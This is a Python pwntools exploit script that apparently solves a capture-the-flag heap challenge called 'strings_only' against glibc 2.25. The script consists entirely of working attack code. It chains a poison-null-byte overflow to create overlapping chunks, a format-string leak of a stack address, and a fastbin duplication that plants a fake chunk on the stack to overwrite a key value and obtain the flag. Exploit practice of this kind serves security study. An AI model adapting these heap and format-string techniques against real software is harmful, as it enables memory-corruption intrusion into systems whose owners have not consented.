#!/usr/bin/env python3

from pwn import *

elf = ELF("./strings_only")
libc = ELF("../glibc/glibc_2.25/libc.so.6")
context.binary = elf

gdb_cmds = ["b * main+490"]
r = ["chal.competitivecyber.club",8888]

def conf():
	if args.REMOTE:
		p = remote(r[0],r[1])
	else:
		p = elf.process()
		if args.GDB:
			gdb.attach(p,gdbscript='\n'.join(gdb_cmds))
	return p

p = conf()
index = 0

def malloc(size):
	p.sendlineafter("> ","1")
	p.sendlineafter("> ",str(size))
	global index
	ret = index
	index += 1
	return ret

def edit(index,data):
	p.sendlineafter("> ","2")
	p.sendlineafter("> ",str(index))
	p.sendlineafter("> ",data)

def read(index):
	p.sendlineafter("> ","3")
	p.sendlineafter("> ",str(index))
	ret = p.readuntil("5. print flag\n")
	return ret

def free(index):
	p.sendlineafter("> ","4")
	p.sendlineafter("> ",str(index))

def main():
	# chunk a causes null byte overflow, chunk b and chunk c are used in pz poison null byte technique
	A = malloc(0x18)
	B = malloc(0x208)
	C = malloc(0x88)
	top_border = malloc(0x18)

	free(B)
	edit(A,b"a"*0x18)

	# utilize top_border chunk for stack leak
	edit(top_border,"%p."*5)
	key = int(read(top_border).split(b".")[3],16)+167
	log.success("key @ "+hex(key))

	# remainder chunk b to cause overlap
	B1 = malloc(0xf8)
	B2 = malloc(0x88)

	free(B1)
	free(C)

	malloc(0xf8)
	free(A)

	# dup primitive
	malloc(0x68)
	fast = malloc(0x68)
	free(fast)
	edit(5,p64(key-24))
	malloc(0x68)

	# need a fake fast chunk on stack, utilize read option
	p.sendlineafter("> ","3")
	p.sendlineafter("> ","127")

	# change key
	dupped = malloc(0x68)
	edit(dupped,b"a"*8+p64(0xcafebabe))
	p.sendlineafter("> ","5")

	p.interactive()


if __name__ == "__main__":
	main()
